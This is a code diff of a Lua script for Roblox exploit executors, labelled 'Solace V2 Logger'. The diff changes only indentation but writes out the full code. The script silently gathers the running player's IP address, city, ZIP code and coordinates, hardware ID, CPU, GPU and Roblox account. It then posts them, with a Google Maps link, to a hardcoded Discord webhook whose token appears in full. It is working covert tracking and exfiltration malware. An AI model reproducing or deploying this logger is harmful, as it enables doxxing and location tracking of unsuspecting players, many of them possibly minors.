@@ -8,114 +8,114 @@ local identifyexecutor = identifyexecutor or function() return "Unknown" end
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1396969265877225614/Oj344KJsWnnbTKaVG14rCo9wPg8DrUJAh5uHIBVINnyvgO6cE6NeG4JLJqY-ptXmQvLd"
 
 local function getIPInfo()
-	local info = {
-		ip = "Unknown",
-		city = "Unknown",
-		region = "Unknown",
-		country = "Unknown",
-		zip = "Unknown",
-		lat = "0",
-		lon = "0",
-		org = "Unknown",
-		isp = "Unknown"
-	}
+    local info = {
+        ip = "Unknown",
+        city = "Unknown",
+        region = "Unknown",
+        country = "Unknown",
+        zip = "Unknown",
+        lat = "0",
+        lon = "0",
+        org = "Unknown",
+        isp = "Unknown"
+    }
 
-	if http_request then
-		local success, response = pcall(function()
-			return http_request({
-				Url = "http://ip-api.com/json",
-				Method = "GET"
-			})
-		end)
+    if http_request then
+        local success, response = pcall(function()
+            return http_request({
+                Url = "http://ip-api.com/json",
+                Method = "GET"
+            })
+        end)
 
-		if success and response and response.Body then
-			local data = HttpService:JSONDecode(response.Body)
-			if data.status == "success" then
-				info.ip = data.query or info.ip
-				info.city = data.city or info.city
-				info.region = data.regionName or info.region
-				info.country = data.country or info.country
-				info.zip = data.zip or info.zip
-				info.lat = tostring(data.lat)
-				info.lon = tostring(data.lon)
-				info.org = data.org or info.org
-				info.isp = data.isp or info.isp
-			end
-		end
-	end
+        if success and response and response.Body then
+            local data = HttpService:JSONDecode(response.Body)
+            if data.status == "success" then
+                info.ip = data.query or info.ip
+                info.city = data.city or info.city
+                info.region = data.regionName or info.region
+                info.country = data.country or info.country
+                info.zip = data.zip or info.zip
+                info.lat = tostring(data.lat)
+                info.lon = tostring(data.lon)
+                info.org = data.org or info.org
+                info.isp = data.isp or info.isp
+            end
+        end
+    end
 
-	return info
+    return info
 end
 
 local function getHWID()
-	local hwid = "Unavailable"
-	pcall(function()
-		hwid = (syn and syn.gethwid and syn.gethwid()) or
-		       (krnl_get_hwid and krnl_get_hwid()) or
-		       (get_hwid and get_hwid()) or
-		       "Unknown"
-	end)
-	return hwid
+    local hwid = "Unavailable"
+    pcall(function()
+        hwid = (syn and syn.gethwid and syn.gethwid()) or
+               (krnl_get_hwid and krnl_get_hwid()) or
+               (get_hwid and get_hwid()) or
+               "Unknown"
+    end)
+    return hwid
 end
 
 local function getHardwareSpecs()
-	local specs = {
-		CPU = "Unavailable",
-		GPU = "Unavailable"
-	}
+    local specs = {
+        CPU = "Unavailable",
+        GPU = "Unavailable"
+    }
 
-	pcall(function()
-		local info = (getpcinfo and getpcinfo()) or (get_hardware_id and get_hardware_id())
-		if info then
-			specs.CPU = info.CPU or "Unknown"
-			specs.GPU = info.GPU or "Unknown"
-		end
-	end)
+    pcall(function()
+        local info = (getpcinfo and getpcinfo()) or (get_hardware_id and get_hardware_id())
+        if info then
+            specs.CPU = info.CPU or "Unknown"
+            specs.GPU = info.GPU or "Unknown"
+        end
+    end)
 
-	return specs
+    return specs
 end
 
 local function sendLogger()
-	local ipInfo = getIPInfo()
-	local hwid = getHWID()
-	local specs = getHardwareSpecs()
-	local executor = identifyexecutor()
-	local avatarUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. player.UserId .. "&width=420&height=420&format=png"
-	local mapsUrl = string.format("https://www.google.com/maps?q=%s,%s", ipInfo.lat, ipInfo.lon)
+    local ipInfo = getIPInfo()
+    local hwid = getHWID()
+    local specs = getHardwareSpecs()
+    local executor = identifyexecutor()
+    local avatarUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. player.UserId .. "&width=420&height=420&format=png"
+    local mapsUrl = string.format("https://www.google.com/maps?q=%s,%s", ipInfo.lat, ipInfo.lon)
 
-	local embed = {
-		title = "📥 Solace Logger Triggered",
-		color = tonumber("0x7289DA"),
-		fields = {
-			{ name = "👤 User", value = string.format("`%s` (%d)", player.Name, player.UserId), inline = false },
-			{ name = "🔧 Executor", value = executor, inline = true },
-			{ name = "💻 HWID", value = "`" .. hwid .. "`", inline = false },
-			{ name = "🖥️ CPU", value = specs.CPU, inline = true },
-			{ name = "🎮 GPU", value = specs.GPU, inline = true },
-			{ name = "🌐 IP", value = "`" .. ipInfo.ip .. "`", inline = false },
-			{ name = "📍 Location", value = string.format("%s, %s %s (%s)", ipInfo.city, ipInfo.region, ipInfo.zip, ipInfo.country), inline = false },
-			{ name = "🗺️ Maps", value = "[View in Google Maps](" .. mapsUrl .. ")", inline = true },
-			{ name = "🏢 ISP / Org", value = ipInfo.isp .. " / " .. ipInfo.org, inline = false },
-			{ name = "🎮 Game", value = game.Name .. " (" .. game.PlaceId .. ")", inline = true },
-			{ name = "🕒 Time", value = os.date("%Y-%m-%d %H:%M:%S"), inline = false },
-		},
-		thumbnail = { url = avatarUrl },
-		footer = { text = "Solace V2 Logger" }
-	}
+    local embed = {
+        title = "📥 Solace Logger Triggered",
+        color = tonumber("0x7289DA"),
+        fields = {
+            { name = "👤 User", value = string.format("`%s` (%d)", player.Name, player.UserId), inline = false },
+            { name = "🔧 Executor", value = executor, inline = true },
+            { name = "💻 HWID", value = "`" .. hwid .. "`", inline = false },
+            { name = "🖥️ CPU", value = specs.CPU, inline = true },
+            { name = "🎮 GPU", value = specs.GPU, inline = true },
+            { name = "🌐 IP", value = "`" .. ipInfo.ip .. "`", inline = false },
+            { name = "📍 Location", value = string.format("%s, %s %s (%s)", ipInfo.city, ipInfo.region, ipInfo.zip, ipInfo.country), inline = false },
+            { name = "🗺️ Maps", value = "[View in Google Maps](" .. mapsUrl .. ")", inline = true },
+            { name = "🏢 ISP / Org", value = ipInfo.isp .. " / " .. ipInfo.org, inline = false },
+            { name = "🎮 Game", value = game.Name .. " (" .. game.PlaceId .. ")", inline = true },
+            { name = "🕒 Time", value = os.date("%Y-%m-%d %H:%M:%S"), inline = false },
+        },
+        thumbnail = { url = avatarUrl },
+        footer = { text = "Solace V2 Logger" }
+    }
 
-	local payload = {
-		username = "Solace Logger",
-		embeds = {embed}
-	}
+    local payload = {
+        username = "Solace Logger",
+        embeds = {embed}
+    }
 
-	pcall(function()
-		http_request({
-			Url = WEBHOOK_URL,
-			Method = "POST",
-			Headers = { ["Content-Type"] = "application/json" },
-			Body = HttpService:JSONEncode(payload)
-		})
-	end)
+    pcall(function()
+        http_request({
+            Url = WEBHOOK_URL,
+            Method = "POST",
+            Headers = { ["Content-Type"] = "application/json" },
+            Body = HttpService:JSONEncode(payload)
+        })
+    end)
 end
 
 -- Run
